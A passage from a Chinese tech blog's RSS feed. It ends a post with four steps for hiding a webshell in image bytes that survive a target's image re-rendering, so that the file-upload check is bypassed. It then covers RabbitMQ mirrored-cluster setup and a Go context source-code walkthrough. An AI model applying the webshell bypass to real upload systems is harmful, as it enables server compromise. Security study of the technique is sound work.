<ul>
<li>1.将正常图片用目标使用的图形库进行转换</li>
<li>2.寻找转换前后两次未变的部分</li>
<li>3.将未变部分替换为欲上传的webshell</li>
<li>4.将替换后的文件进行图像转换，看是否转换后仍存在替换后部分</li>
</ul>
</li>
</ul>
]]></description>
</item><item>
    <title>工作日记-rabbitmq镜像集群部署(短篇)</title>
    <link>https://testoai.github.io/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</link>
    <pubDate>Tue, 18 May 2021 15:22:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</guid>
    <description><![CDATA[<p>记录一次工作中搭建rabbitmq集群遇到的问题</p>
<h2 id="rabbitmq是啥">rabbitmq是啥</h2>
<p>erlang语言编写的开源的用来做消息队列的系统</p>
<h2 id="集群部署流程centos7">集群部署流程（centos7）</h2>
<p>erlang部署略</p>
<p>rabbitmq单节点部署略</p>
<ul>
<li>下载与自己服务器相应的包，我下载了一个Unix的包，然后日志提示读取磁盘信息错误，centos7下载el7的包即可</li>
</ul>
<p>192.168.1.10</p>
<p>192.168.1.11</p>
<p>192.168.1.12</p>
<p>配置集群</p>
<p>10为主节点</p>
<ul>
<li>1.在/etc/hosts文件中配置三台机器的主机名和IP映射，三台服务器都要配置</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">192.168.1.10 mqa

192.168.1.11 mqb

192.168.1.12 mqc
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>2.修改/var/lib/rabbitmq/.erlang.cookie文件中的内容，需要三台服务器一致</p>
<p>该文件其他人的权限必须是0</p>
</li>
<li>
<p>3.在mqb和mqc执行下面命令添加到mqa节点</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">systemctl start rabbitmq-server # 启动服务
rabbitmqctl stop_app            # 停止rabbitmq应用
rabbitmqctl reset               # 重置节点，该操作会删除该节点的集群信息，持久化信息，用户信息
rabbitmqctl join_cluster rabbit@mqa # 将该节点添加到mqa节点下，mqa节点必须是开启状态
rabbitmqctl start_app           # 启动rabbitmq应用
rabbitmqctl-plugins enable rabbitmq_management # 开启web管理插件，如果想在浏览器查看集群状态时，每个节点都要启用该配置
</code></pre></td></tr></table>
</div>
</div><ul>
<li>4.在主节点开启web管理插件</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">rabbitmq-plugins enable rabbitmq_management
</code></pre></td></tr></table>
</div>
</div><ul>
<li>5.在浏览器访问主节点IP+15672端口就能看到集群相关信息了</li>
</ul>
<p>写的很简单，过程很心酸😭</p>
]]></description>
</item><item>
    <title>Golang之Context</title>
    <link>https://testoai.github.io/posts/golang-context/</link>
    <pubDate>Tue, 11 May 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/golang-context/</guid>
    <description><![CDATA[<p>对context的源码理解还没有很深，当前只处于学习阶段</p>
<h2 id="context是啥">Context是啥</h2>
<p>context是go中跨越API边界以及进程之间的取消信号和其他请求范围的值 &ndash;摘自contex.context.go</p>
<p>在Go1.7版本中引入了context，主要用于在goroutine之间传递上下文消息，包括取消信号，超时时间，截止时间，键值对</p>
<p>context是并发安全的</p>
<h2 id="为什么需要context">为什么需要Context</h2>
<p>在go中，每个请求需要开启一个goroutine去处理，但是在大部分业务流程中，一个goroutine并不能很好的满足需求，通常一个请求需要开启多个goroutine来处理该请求，比如一些预处理的工作</p>
<p>但是在业务中由于某些原因（比如操作被取消，请求超时等），业务流程可能会被中断，那么由该请求开启的一些goroutine就会变成孤儿协程，造成资源浪费</p>
<p>那么此时就需要来通知这些goroutine关闭</p>
<p>在go中channel+select可以用来给子goroutine发送信号，通知它们关闭，但是在某些场景下用该方式就会比较复杂，搞不好容易写出问题</p>
<p>于是context应运而生</p>
<h2 id="context包">Context包</h2>
<h3 id="context接口">context接口：</h3>
<ul>
<li>
<p><code>Deadline()</code>：返回context的截止时间，通过判断该时间，函数就能决定是否进行下面的操作</p>
</li>
<li>
<p><code>Done()</code>：返回一个只读的channel，表示context被取消的信号，当这个channel被关闭时，说明context被取消了。</p>
<ul>
<li>channel为空且不关闭时，读不出任何东西，当关闭时，则会读出存储类型的零值</li>
</ul>
</li>
<li>
<p><code>Err()</code>：返回channel被关闭的原因</p>
</li>
<li>
<p><code>Value()</code>：获取设置的key所对应的val</p>
</li>
</ul>
<h3 id="canceler接口">Canceler接口：</h3>
<ul>
<li>该接口定义了cancel方法和Done方法，用来取消context</li>
<li>实现了这两个方法的struct是：<code>*cancelCtx</code>和<code>*timeCtx</code></li>
</ul>
<h3 id="emptyctx">emptyCtx</h3>
<p><code>type emptyCtx int</code></p>
<ul>
<li>
<p>emptyCtx永远不会取消，没有值，也没有截止日期</p>
</li>
<li>
<p>它不是struct {}，因为此类型的var必须具有不同的地址</p>
</li>
</ul>
<p>该类型体实现了context接口中定义的方法</p>
<p>下面定义了两个变量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">var</span> <span class="p">(</span>
	<span class="nx">background</span> <span class="p">=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">emptyCtx</span><span class="p">)</span>
	<span class="nx">todo</span>       <span class="p">=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">emptyCtx</span><span class="p">)</span>
<span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>然后通过下面两个方法对外开放</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">// Background returns a non-nil, empty Context. It is never canceled, has no
</span><span class="c1">// values, and has no deadline. It is typically used by the main function,
</span><span class="c1">// initialization, and tests, and as the top-level Context for incoming
</span><span class="c1">// requests.
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">Background</span><span class="p">()</span> <span class="nx">Context</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nx">background</span>
<span class="p">}</span>

<span class="c1">// TODO returns a non-nil, empty Context. Code should use context.TODO when
</span><span class="c1">// it&#39;s unclear which Context to use or it is not yet available (because the
</span><span class="c1">// surrounding function has not yet been extended to accept a Context
</span><span class="c1">// parameter).
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">TODO</span><span class="p">()</span> <span class="nx">Context</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nx">todo</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>Background主要用来初始化根节点，是context的默认值，并且还作为上下文的根节点存在</p>
</li>
<li>
<p>TODO方法返回一个非空的context，当不知道要传入那个context时，可以传入context.TODO</p>
</li>
</ul>
<h3 id="cancelctx结构体">cancelCtx结构体</h3>
<p>cancelCtx可以被取消，该结构体实现了canceler接口，它将Context作为它的一个匿名字段，这样该结构体就可以被看作成一个context</p>
<p><code>Done()</code>方法：该方法被调用时才会make一个存放struct的channel，然后把该channel返回</p>
<p><code>Err()</code>方法：该方法返回一个context取消的原因</p>
<p><code>cancel()</code>方法：通过关闭c.done，递归取消传递下去的所有子节点，从父节点删除自己，子goroutine接收关闭信号的方式就是select只读的c.done</p>
<h3 id="withcancel函数">WithCancel函数</h3>
<p>该函数需要传入一个根节点，上面说的Background，然后会返回一个子context，和一个用于取消子context的cancel函数，一旦调用cancel函数，当前context的子节点就会select到关闭的c.done，从而关闭goroutine</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">WithCancel</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">)</span> <span class="p">(</span><span class="nx">ctx</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">cancel</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">c</span> <span class="o">:=</span> <span class="nf">newCancelCtx</span><span class="p">(</span><span class="nx">parent</span><span class="p">)</span>
	<span class="nf">propagateCancel</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">c</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">c</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">Canceled</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>newCancelCtx</code>将传入的上下文包装成私有结构体context.cancelCtx</li>
<li><code>propagateCancel</code>函数会构建上下文之间的关联，当父context被取消时，取消子context</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">propagateCancel</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">child</span> <span class="nx">canceler</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">done</span> <span class="o">:=</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
	<span class="k">if</span> <span class="nx">done</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="c1">// 父上下文不会触发取消信号
</span><span class="c1"></span>	<span class="p">}</span>
	<span class="k">select</span> <span class="p">{</span>
	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">done</span><span class="p">:</span>
		<span class="nx">child</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Err</span><span class="p">())</span> <span class="c1">// 父上下文已经被取消
</span><span class="c1"></span>		<span class="k">return</span>
	<span class="k">default</span><span class="p">:</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="nx">p</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nf">parentCancelCtx</span><span class="p">(</span><span class="nx">parent</span><span class="p">);</span> <span class="nx">ok</span> <span class="p">{</span>
		<span class="nx">p</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
		<span class="k">if</span> <span class="nx">p</span><span class="p">.</span><span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">child</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">p</span><span class="p">.</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">p</span><span class="p">.</span><span class="nx">children</span><span class="p">[</span><span class="nx">child</span><span class="p">]</span> <span class="p">=</span> <span class="kd">struct</span><span class="p">{}{}</span>
		<span class="p">}</span>
		<span class="nx">p</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">select</span> <span class="p">{</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">parent</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
				<span class="nx">child</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Err</span><span class="p">())</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">child</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
			<span class="p">}</span>
		<span class="p">}()</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>对上面代码的解读</p>
<ul>
<li>
<p>如果context.Done为空时，则不会出发取消事件，函数直接返回</p>
</li>
<li>
<p>当传入的根节点的context对象的Done被关闭时，child也就是子context会被直接取消</p>
</li>
<li>
<p><code>parentCancelCtx</code>函数返回父级的基础<code>*cancelCtx</code>，如果是父级也是<code>*context</code>时，</p>
</li>
<li>
<p>child会被加入根context的children列表中，等待根context发送取消信号</p>
</li>
<li>
<p>如果父级不是<code>*context</code>的话，则开启一个新的goroutine监听根节点的Done()，和child.Done()两个channel，如果根节点的Done()被关闭时，则调用child的cancel取消子上下文</p>
</li>
</ul>
<p>所以该函数的作用是在根context和子context之间同步取消信号，保证根context被取消后，子context也能收到取消信号</p>
<h4 id="contextconcelctxcancel">context.concelCtx.cancel()</h4>
<p>该方法会关闭context中的channel并同步取消信号</p>
<h3 id="timerctx">timerCtx</h3>
<p>该结构体基于<code>cancelCtx</code>，添加了time.Timer和deadline</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">// A timerCtx carries a timer and a deadline. It embeds a cancelCtx to
</span><span class="c1">// implement Done and Err. It implements cancel by stopping its timer then
</span><span class="c1">// delegating to cancelCtx.cancel.
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">timerCtx</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">cancelCtx</span>
	<span class="nx">timer</span> <span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Timer</span> <span class="c1">// Under cancelCtx.mu.
</span><span class="c1"></span>
	<span class="nx">deadline</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>通过cancelCtx来实现Done和Err</p>
<p>计时器到期时则通知cancelCtx.cancel来关闭context</p>
<p><code>*timerCtx.cancel</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">timerCtx</span><span class="p">)</span> <span class="nf">cancel</span><span class="p">(</span><span class="nx">removeFromParent</span> <span class="kt">bool</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">c</span><span class="p">.</span><span class="nx">cancelCtx</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">removeFromParent</span> <span class="p">{</span>
		<span class="c1">// Remove this timerCtx from its parent cancelCtx&#39;s children.
</span><span class="c1"></span>		<span class="nf">removeChild</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">cancelCtx</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
	<span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">timer</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">c</span><span class="p">.</span><span class="nx">timer</span><span class="p">.</span><span class="nf">Stop</span><span class="p">()</span>
		<span class="nx">c</span><span class="p">.</span><span class="nx">timer</span> <span class="p">=</span> <span class="kc">nil</span>
	<span class="p">}</span>
	<span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>第二行调用了contextCtx的cancel方法</p>
<p>第三行，如果removeFromParent为true，则调用removeChild方法从父节点中删除子节点</p>
<p>第八行，如果定时器不为空，则停止计时，防止时间到了之后再次发起取消信号</p>
<h3 id="withtimeout函数">WithTimeout函数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">timeout</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">Add</span><span class="p">(</span><span class="nx">timeout</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>该函数返回的是WithDeadline函数，参数是一个根context对象和当前时间+超时时间</p>
<h3 id="withdeadline函数">WithDeadline函数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">d</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">if</span> <span class="nx">cur</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Deadline</span><span class="p">();</span> <span class="nx">ok</span> <span class="o">&amp;&amp;</span> <span class="nx">cur</span><span class="p">.</span><span class="nf">Before</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// The current deadline is already sooner than the new one.
</span><span class="c1"></span>      <span class="k">return</span> <span class="nf">WithCancel</span><span class="p">(</span><span class="nx">parent</span><span class="p">)</span>
   <span class="p">}</span>
   <span class="nx">c</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">timerCtx</span><span class="p">{</span>
      <span class="nx">cancelCtx</span><span class="p">:</span> <span class="nf">newCancelCtx</span><span class="p">(</span><span class="nx">parent</span><span class="p">),</span>
      <span class="nx">deadline</span><span class="p">:</span>  <span class="nx">d</span><span class="p">,</span>
   <span class="p">}</span>
   <span class="nf">propagateCancel</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span>
   <span class="nx">dur</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Until</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span>
   <span class="k">if</span> <span class="nx">dur</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">{</span>
      <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">DeadlineExceeded</span><span class="p">)</span> <span class="c1">// deadline has already passed
</span><span class="c1"></span>      <span class="k">return</span> <span class="nx">c</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">Canceled</span><span class="p">)</span> <span class="p">}</span>
   <span class="p">}</span>
   <span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
   <span class="k">defer</span> <span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
   <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
      <span class="nx">c</span><span class="p">.</span><span class="nx">timer</span> <span class="p">=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">AfterFunc</span><span class="p">(</span><span class="nx">dur</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
         <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">DeadlineExceeded</span><span class="p">)</span>
      <span class="p">})</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="nx">c</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">Canceled</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>官方注释写的是该函数返回父context的children，并将截止日期调整为不晚于传入的时间</p>
<p>第二行，如果父级的截止时间更早，则返回</p>
<p><code>c := &amp;timerCtx</code>：新建timerCtx对象，deadline的值为传入的截止时间，context使用传入的跟节点</p>
<p>第十行，调用propagateCancel函数，当父节点被取消时取消子节点</p>
<p><code> dur := time.Until(d)</code>：得到一个当前时间到d的时间差</p>
<p>如果截止时间已过，则调用cancel方法，并传入超过截止时间的错误</p>
<p>如果新建的context的err为空，则返回一个截止时间的计时器</p>
<h3 id="valuectx">valueCtx</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">valueCtx</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">Context</span>
   <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="kd">interface</span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>valueCtx继承了Context</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">valueCtx</span><span class="p">)</span> <span class="nf">String</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nf">contextName</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;.WithValue(type &#34;</span> <span class="o">+</span>
      <span class="nx">reflectlite</span><span class="p">.</span><span class="nf">TypeOf</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">key</span><span class="p">).</span><span class="nf">String</span><span class="p">()</span> <span class="o">+</span>
      <span class="s">&#34;, val &#34;</span> <span class="o">+</span> <span class="nf">stringify</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">val</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;)&#34;</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">valueCtx</span><span class="p">)</span> <span class="nf">Value</span><span class="p">(</span><span class="nx">key</span> <span class="kd">interface</span><span class="p">{})</span> <span class="kd">interface</span><span class="p">{}</span> <span class="p">{</span>
   <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">key</span> <span class="o">==</span> <span class="nx">key</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">val</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Context</span><span class="p">.</span><span class="nf">Value</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>valueCtx实现了String和Value方法</p>
<p>value方法返回key的val，如果当前节点不存在，则查找上一个节点，这里是一个递归操作</p>
<p>使用WithValue函数来创建valueCtx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">WithValue</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="kd">interface</span><span class="p">{})</span> <span class="nx">Context</span> <span class="p">{</span>
   <span class="k">if</span> <span class="nx">key</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
      <span class="nb">panic</span><span class="p">(</span><span class="s">&#34;nil key&#34;</span><span class="p">)</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="p">!</span><span class="nx">reflectlite</span><span class="p">.</span><span class="nf">TypeOf</span><span class="p">(</span><span class="nx">key</span><span class="p">).</span><span class="nf">Comparable</span><span class="p">()</span> <span class="p">{</span>
      <span class="nb">panic</span><span class="p">(</span><span class="s">&#34;key is not comparable&#34;</span><span class="p">)</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="o">&amp;</span><span class="nx">valueCtx</span><span class="p">{</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span><span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>官方的注释写的是返回父项的副本，key必须可以比较，不能为string类型(string可以比较吧，而且我试了string也可以啊😥)或者其它内置类型，避免使用上下文在程序包之间发生冲突</p>
<h2 id="使用context">使用Context</h2>
